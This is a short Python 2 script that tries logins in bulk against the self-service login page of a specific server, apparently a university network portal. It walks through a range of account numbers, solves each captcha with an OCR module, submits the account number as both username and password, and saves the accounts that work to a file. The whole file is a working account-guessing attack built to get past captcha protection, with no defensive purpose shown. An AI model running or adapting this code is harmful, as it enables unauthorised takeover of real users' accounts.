# -*- coding: utf-8 -*-
"""
Created on Sun May 22 21:35:36 2016
循环访问服务器，试账号
@author: mike
"""
import urllib2
import urllib
import re
import PIL.Image as Image
import image2text
import pylab
import cookielib


path = r'C:\Users\mike\Desktop\spider_GDUT\pic2'
host = 'http://222.200.98.3'
url = host+'/selfservice/login.jsf'
account = int(raw_input('star:'))         #输入开始账号
account_end = int(raw_input('end:'))       #输入结束账号（不包括）
while account<account_end:
    cookies =''
    headers={
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control':'max-age=0',
    'Connection':'keep-alive',
    'Cookie':cookies,
    'Host':'222.200.98.3',
    'Referer':'http://222.200.98.3/selfservice/login2.jsf',
    'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0'
    }
    #   first request-------------------------------
    req = urllib2.Request(url=url,headers=headers)
    res = urllib2.urlopen(req)
    cookies = res.info().getheader('Set-Cookie')
    cook_L = re.split(',|;',cookies)
    html = res.read()
    viewstate = re.findall('id="javax.faces.ViewState" value="(.+?)"',html)
    p_url_t = re.findall('<img src=(.+)jpg',html)
    if len(p_url_t)>0:
        p_url = host+p_url_t[0][1:]+'jpg'
        urllib.urlretrieve(p_url,'temp.jpg')
        im = Image.open('temp.jpg')
        code = image2text.str2text(im)
        if len(code)==4:
            data = {'mainForm:username':'0000'+str(account)[1:],
            'mainForm:password':'0000'+str(account)[1:],
            'mainForm:code':code,
            'mainForm:usertype_input':'1',
            'mainForm:usertype_focus':'',
            'mainForm:loginCmd':'',
            'mainForm:ifCheckCode':'true',
            'mainForm_SUBMIT':'1',
            'javax.faces.ViewState':viewstate[0],
            'mainForm:descContent':'普通用户查询及修改个人信息<br>普通用户修改用户密码<br>普通用户查询上网明细<br>设备管理用户查询及修改个人信息<br>设备管理用户修改用户密码<br>用户预注册'}  
            value = urllib.urlencode(data)
            headers={
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Cache-Control':'max-age=0',
            'Connection':'keep-alive',
            'Content-Type':'application/x-www-form-urlencoded',
            'Origin':'http://222.200.98.3',
            'Cookie':cookies,
            'Content-Length':len(value),
            'Host':'222.200.98.3',
            'Referer':'http://222.200.98.3/selfservice/login.jsf',
            'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0'
            }
            req = urllib2.Request(url,value,headers)
            response = urllib2.urlopen(req)
            html1 = response.read()
            if len(re.findall('登录名',html1))>0:
                f = open(r'account.txt','a')
                f.write('0000'+str(account)[1:]+'\n')
                f.close()
                account = account+1
                print '0000'+str(account)[1:]+' success!'
            elif len(re.findall('验证码错误',html1))>0:
                print 'code error'
            else:
                print '0000'+str(account)[1:]+' fauilt!'
                account = account+1
                